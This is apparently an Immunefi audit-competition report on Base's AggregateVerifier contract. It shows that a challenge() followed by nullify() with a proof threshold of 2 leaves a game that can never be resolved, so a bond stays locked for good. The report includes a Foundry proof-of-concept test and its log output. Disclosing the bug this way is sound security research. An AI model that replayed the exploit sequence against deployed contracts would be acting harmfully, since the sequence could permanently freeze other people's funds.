# 74546 sc low permanent bond lockup when proof threshold 2 after challenge nullify sequence

**Submitted on Apr 23rd 2026 at 10:33:48 UTC by @New5paceXyz for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74546
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Permanent freezing of funds in the bridge or in dispute game bonds with no available recovery path

## Description

### Brief/Intro

When `AggregateVerifier` is deployed with `PROOF_THRESHOLD = 2`, a `challenge()` call followed by a `nullify()` call leaves the game permanently unresolvable. `resolve()` is blocked by `NotEnoughProofs`, `claimCredit()` is blocked by `GameNotResolved`, and no new proof can ever be submitted to break the deadlock. For root games, the bond is locked forever with no recovery path. The developer's own in-code comment directly contradicts this behavior, confirming it is unintended.

### Vulnerability Details

Two independent design decisions collide when `PROOF_THRESHOLD = 2`:

1. `resolve()` unconditionally enforces `proofCount >= PROOF_THRESHOLD` (L458) before resolving.
2. `nullify()` permanently disables the ZK verifier by calling `IVerifier(ZK_VERIFIER).nullify()` (L598), making it impossible to ever submit another ZK proof. At the same time, the TEE slot remains occupied, so `proofCount` is stuck at 1 and can never increase again.

After the sequence, the contract demands 2 proofs to resolve but can only ever hold 1. There is no code path that allows the game to exit this state.

### Proof of Deadlock

{% stepper %}
{% step %}

## Step 1 — `initializeWithInitData()`

A valid TEE proof is submitted. The game starts normally.

```solidity
proofTypeToProver[TEE] = gameCreator()
proofCount              = 1
expectedResolution      = block.timestamp + SLOW_FINALIZATION_DELAY  (7 days)
```

{% endstep %}

{% step %}

## Step 2 — `challenge()` *(L523–540)*

Anyone submits a valid ZK proof disputing an intermediate root.

```solidity
proofTypeToProver[ZK]                      = challenger
proofCount                                 = 2   // incremented manually at L531
counteredByIntermediateRootIndexPlusOne    = intermediateRootIndex + 1
expectedResolution                         = block.timestamp + 7 days
```

{% endstep %}

{% step %}

## Step 3 — `nullify()` *(L548–601)* — **deadlock trigger**

Anyone proves via ZK that the challenged intermediate root is actually correct (i.e., the ZK challenge was wrong). `_proofRefutedUpdate(ZK)` runs:

```solidity
delete proofTypeToProver[ZK]         // ZK slot cleared
proofCount -= 1                      → proofCount = 1
_increaseExpectedResolution():
    _getDelay(proofCount=1)          → SLOW_FINALIZATION_DELAY   // NOT type(uint64).max
    expectedResolution               = block.timestamp + 7 days
```

Then:

```solidity
delete counteredByIntermediateRootIndexPlusOne   → 0
IVerifier(ZK_VERIFIER).nullify()                 → ZK verifier PERMANENTLY disabled
```

**Game state after Step 3:**

```solidity
proofTypeToProver[TEE]  = gameCreator()    // still set
proofTypeToProver[ZK]   = address(0)       // cleared
proofCount              = 1
expectedResolution      = block.timestamp + 7 days   // NOT type(uint64).max
ZK_VERIFIER.nullified   = true             // permanent, enforced by notNullified modifier
status                  = IN_PROGRESS
resolvedAt              = 0
```

{% endstep %}
{% endstepper %}

### Every Exit Path Is Blocked

**`resolve()` — blocked by `NotEnoughProofs`**

After 7 days, `gameOver()` returns `true`. The parent game is `DEFENDER_WINS` for a root game, so execution takes the `else` branch at L455. The check at L458 fires:

```solidity
if (proofCount < PROOF_THRESHOLD) revert NotEnoughProofs();  // 1 < 2 → always reverts
```

**`claimCredit()` — blocked by `GameNotResolved`**

`claimCredit()` has a 14-day fallback, but it only activates when `expectedResolution == type(uint64).max` (L613). After Step 3, `expectedResolution = block.timestamp + 7 days` because `_getDelay(proofCount=1)` returns `SLOW_FINALIZATION_DELAY`, not `type(uint64).max`. The 14-day branch is never reached:

```solidity
if (expectedResolution.raw() != type(uint64).max) {   // true → enters here
    if (resolvedAt.raw() == 0) revert GameNotResolved(); // resolvedAt = 0 → always reverts
}
```

**`verifyProposalProof(ZK)` — blocked by nullified verifier**

The `proofTypeToProver[ZK]` slot is empty, so the `AlreadyProven` guard passes. But `_verifyProof()` calls `ZK_VERIFIER.verify()`, which hits the `notNullified` modifier and reverts permanently.

**`verifyProposalProof(TEE)` — blocked by `AlreadyProven`**

`proofTypeToProver[TEE]` is still set to `gameCreator()`. The check at L426 reverts immediately:

```solidity
if (proofTypeToProver[proofType] != address(0)) revert AlreadyProven(proofType);
```

**`challenge()` again — blocked by nullified verifier**

`challenge()` internally calls `_verifyProof()` with a ZK proof type. This reaches `ZK_VERIFIER.verify()` and reverts for the same reason as above.

## Impact Details

* The TEE proposer, who submitted a correct and honest proof, permanently loses their bond — not because they did anything wrong, but because the ZK challenger was wrong.
* The bond is not redistributed to any party. It is simply locked forever.
* Once `nullify()` is called, the `ZK_VERIFIER` is permanently disabled for all games that share the same instance — the impact extends beyond a single game.
* Root games (`parentAddress == ANCHOR_STATE_REGISTRY`) have absolutely no escape. Non-root games have a narrow escape only if their parent resolves as `CHALLENGER_WINS`.

## References

<https://github.com/base/contracts/blob/v8.1.0/src/multiproof/AggregateVerifier.sol>

## Proof of Concept

1. Deploy `AggregateVerifier` with `PROOF_THRESHOLD = 2`.
2. Call `initializeWithInitData()` with a valid TEE proof. Observe `proofCount = 1`.
3. Call `challenge()` with a valid ZK proof for any intermediate root. Observe `proofCount = 2`.
4. Call `nullify()` with a ZK proof proving the same intermediate root is correct. Observe `proofCount = 1`, `ZK_VERIFIER.nullified = true`.
5. Wait 7 days. Call `resolve()`. Observe revert: `NotEnoughProofs`.
6. Call `claimCredit()`. Observe revert: `GameNotResolved`.
7. Attempt `verifyProposalProof()` with any proof type. Both revert (ZK: nullified verifier; TEE: `AlreadyProven`).
8. Bond is permanently locked.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";
import { Verifier } from "src/multiproof/Verifier.sol";
import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";
import { IVerifier } from "interfaces/multiproof/IVerifier.sol";
import { Claim, GameStatus } from "src/dispute/lib/Types.sol";
import { GameNotResolved } from "src/dispute/lib/Errors.sol";

import { BaseTest } from "./BaseTest.t.sol";

/// @notice POC: Permanent bond lockup when PROOF_THRESHOLD = 2 after challenge() + nullify() sequence.
///
/// Vulnerability: After challenge() sets proofCount = 2 and nullify() decrements proofCount back to 1
/// while permanently disabling the ZK verifier, no exit path remains:
///   - resolve()           reverts: NotEnoughProofs  (1 < 2)
///   - claimCredit()       reverts: GameNotResolved  (expectedResolution != type(uint64).max)
///   - verifyProposalProof(ZK)  reverts: Nullified   (verifier permanently disabled)
///   - verifyProposalProof(TEE) reverts: AlreadyProven
///   - challenge()         reverts: Nullified        (can't submit new ZK challenge)
///
/// The bond is permanently locked with no recovery path.
contract PocBondLockup is BaseTest {
    // -----------------------------------------------------------------------
    // Override setUp: deploy AggregateVerifier with PROOF_THRESHOLD = 2
    // -----------------------------------------------------------------------
    function setUp() public override {
        _deployContractsAndProxies();
        _initializeProxies();
        _deployAndSetAggregateVerifierWithThreshold(2);
        anchorStateRegistry.setRespectedGameType(AGGREGATE_VERIFIER_GAME_TYPE);
        vm.warp(block.timestamp + 1);
    }

    function _deployAndSetAggregateVerifierWithThreshold(uint256 threshold) internal {
        AggregateVerifier impl = new AggregateVerifier(
            AGGREGATE_VERIFIER_GAME_TYPE,
            IAnchorStateRegistry(address(anchorStateRegistry)),
            IDelayedWETH(payable(address(delayedWETH))),
            IVerifier(address(teeVerifier)),
            IVerifier(address(zkVerifier)),
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            BLOCK_INTERVAL,
            INTERMEDIATE_BLOCK_INTERVAL,
            threshold
        );
        factory.setImplementation(AGGREGATE_VERIFIER_GAME_TYPE, IDisputeGame(address(impl)));
        factory.setInitBond(AGGREGATE_VERIFIER_GAME_TYPE, INIT_BOND);
    }

    // -----------------------------------------------------------------------
    // Main POC
    // -----------------------------------------------------------------------

    /// @notice Demonstrates that a root game with PROOF_THRESHOLD = 2 becomes permanently
    ///         unresolvable after challenge() + nullify(), permanently locking the TEE
    ///         proposer's bond with no recovery path.
    function testPoc_PermanentBondLockup_ProofThreshold2() public {
        // ── Step 1: initialize the game with a valid TEE proof ────────────
        currentL2BlockNumber += BLOCK_INTERVAL;
        Claim rootClaim = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber)));
        bytes memory teeProof = _generateProof("tee-proof", AggregateVerifier.ProofType.TEE);

        AggregateVerifier game = _createAggregateVerifierGame(
            TEE_PROVER, rootClaim, currentL2BlockNumber, address(anchorStateRegistry), teeProof
        );

        assertEq(game.PROOF_THRESHOLD(), 2,   "threshold must be 2 for this bug");
        assertEq(game.proofCount(),      1,   "TEE proof recorded");
        assertEq(game.teeProver(),       TEE_PROVER, "TEE prover set");
        assertEq(game.zkProver(),        address(0), "no ZK prover yet");
        assertFalse(zkVerifier.nullified(), "ZK verifier active");

        emit log("Step 1 OK: game initialized with TEE proof, proofCount = 1");

        // ── Step 2: ATTACKER calls challenge() with a ZK proof ────────────
        // The ZK proof claims a *different* intermediate root for index 0.
        uint256 intermediateRootIndex = 0;
        bytes32 originalRoot = game.intermediateOutputRoot(intermediateRootIndex);
        // Must differ from originalRoot to pass _checkIntermediateRoot
        bytes32 fakeRoot = keccak256(abi.encodePacked("fake", originalRoot));

        // Proof format for challenge/nullify: byte0 = ProofType, bytes1+ = proof payload
        // MockVerifier.verify() always returns true, so any non-empty payload works.
        bytes memory zkProof = abi.encodePacked(uint8(AggregateVerifier.ProofType.ZK), bytes1(0));

        vm.prank(ATTACKER);
        game.challenge(zkProof, intermediateRootIndex, fakeRoot);

        assertEq(game.proofCount(),                        2,                        "proofCount bumped to 2");
        assertEq(game.counteredByIntermediateRootIndexPlusOne(), intermediateRootIndex + 1, "challenge recorded");
        assertFalse(zkVerifier.nullified(),                "ZK verifier still active");
        assertEq(game.zkProver(),                         ATTACKER,                 "ATTACKER is ZK prover");

        emit log("Step 2 OK: challenged, proofCount = 2");

        // ── Step 3: Anyone calls nullify() proving the original root correct ──
        // After challenge, nullify requires:
        //   intermediateRootIndex == counteredByIntermediateRootIndexPlusOne - 1
        //   intermediateRootToProve == originalRoot  (i.e., the STORED root)
        //   proofType == ZK
        bytes memory nullifyProof = abi.encodePacked(uint8(AggregateVerifier.ProofType.ZK), bytes1(0));

        game.nullify(nullifyProof, intermediateRootIndex, originalRoot);

        // --- DEADLOCK STATE ---
        assertEq(game.proofCount(),     1,     "proofCount back to 1");
        assertEq(game.zkProver(),       address(0), "ZK slot cleared");
        assertEq(game.teeProver(),      TEE_PROVER, "TEE slot still set");
        assertTrue(zkVerifier.nullified(),          "ZK verifier PERMANENTLY disabled");
        assertEq(game.counteredByIntermediateRootIndexPlusOne(), 0, "challenge cleared");
        // expectedResolution = block.timestamp + 7 days  (NOT type(uint64).max)
        assertTrue(game.expectedResolution().raw() != type(uint64).max, "claimCredit fallback unreachable");

        emit log("Step 3 OK: nullified, proofCount = 1, ZK verifier permanently disabled");
        emit log("DEADLOCK: need 2 proofs to resolve but can only ever hold 1");

        // ── Step 4: prove all proof submission paths are blocked (before timer) ──
        // These checks happen while game is still IN_PROGRESS (not yet gameOver),
        // so verifyProposalProof doesn't hit the gameOver() guard first.

        // 4a. verifyProposalProof(ZK) → Nullified (verifier permanently disabled)
        bytes memory zkProofAttempt = abi.encodePacked(uint8(AggregateVerifier.ProofType.ZK), bytes1(0));
        vm.prank(ZK_PROVER);
        vm.expectRevert(Verifier.Nullified.selector);
        game.verifyProposalProof(zkProofAttempt);

        emit log("Step 4a OK: verifyProposalProof(ZK) reverts Nullified");

        // 4b. verifyProposalProof(TEE) → AlreadyProven (TEE slot is occupied)
        bytes memory teeProofAttempt = abi.encodePacked(uint8(AggregateVerifier.ProofType.TEE), bytes1(0));
        vm.prank(address(0x1234));
        vm.expectRevert(abi.encodeWithSelector(AggregateVerifier.AlreadyProven.selector, AggregateVerifier.ProofType.TEE));
        game.verifyProposalProof(teeProofAttempt);

        emit log("Step 4b OK: verifyProposalProof(TEE) reverts AlreadyProven");

        // 4c. challenge() again → Nullified (any new ZK challenge still goes through ZK_VERIFIER.verify())
        bytes32 anotherFakeRoot = keccak256(abi.encodePacked("fake2", originalRoot));
        bytes memory challengeAgain = abi.encodePacked(uint8(AggregateVerifier.ProofType.ZK), bytes1(0));
        vm.prank(ATTACKER);
        vm.expectRevert(Verifier.Nullified.selector);
        game.challenge(challengeAgain, intermediateRootIndex, anotherFakeRoot);

        emit log("Step 4c OK: challenge() reverts Nullified");
        emit log("No proof can ever be added. proofCount is permanently stuck at 1.");

        // ── Step 5: wait for the 7-day timer ─────────────────────────────
        vm.warp(block.timestamp + 7 days + 1);
        assertTrue(game.gameOver(), "game timer expired");

        // ── Step 6: resolve() is permanently blocked ──────────────────────
        // L458: if (proofCount < PROOF_THRESHOLD) revert NotEnoughProofs();
        // 1 < 2 → always reverts
        vm.expectRevert(AggregateVerifier.NotEnoughProofs.selector);
        game.resolve();

        emit log("Step 6 OK: resolve() reverts NotEnoughProofs (1 < 2)");

        // ── Step 7: claimCredit() is permanently blocked ──────────────────
        // L613: if (expectedResolution != type(uint64).max) { if (resolvedAt == 0) revert GameNotResolved(); }
        // expectedResolution = block.timestamp + 7 days  (not max) and resolvedAt = 0
        vm.expectRevert(GameNotResolved.selector);
        game.claimCredit();

        emit log("Step 7 OK: claimCredit() reverts GameNotResolved");

        // ── CONCLUSION ────────────────────────────────────────────────────
        emit log("");
        emit log("=== POC COMPLETE ===");
        emit log("The TEE proposer submitted a correct proof and their bond is 1 ETH.");
        emit log("The ZK challenger was WRONG (nullify proved the original root is correct).");
        emit log("Despite the challenger being wrong, the proposer's bond is PERMANENTLY LOCKED.");
        emit log("No function can ever resolve, recover, or redistribute the bond.");
        assertEq(uint8(game.status()), uint8(GameStatus.IN_PROGRESS), "game stuck IN_PROGRESS forever");
    }
}
```

```
Logs:
  Step 1 OK: game initialized with TEE proof, proofCount = 1
  Step 2 OK: challenged, proofCount = 2
  Step 3 OK: nullified, proofCount = 1, ZK verifier permanently disabled
  DEADLOCK: need 2 proofs to resolve but can only ever hold 1
  Step 4a OK: verifyProposalProof(ZK) reverts Nullified
  Step 4b OK: verifyProposalProof(TEE) reverts AlreadyProven
  Step 4c OK: challenge() reverts Nullified
  No proof can ever be added. proofCount is permanently stuck at 1.
  Step 6 OK: resolve() reverts NotEnoughProofs (1 < 2)
  Step 7 OK: claimCredit() reverts GameNotResolved

  === POC COMPLETE ===
  The TEE proposer submitted a correct proof and their bond is 1 ETH.
  The ZK challenger was WRONG (nullify proved the original root is correct).
  Despite the challenger being wrong, the proposer's bond is PERMANENTLY LOCKED.
  No function can ever resolve, recover, or redistribute the bond.

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.74ms (3.59ms CPU time)
```
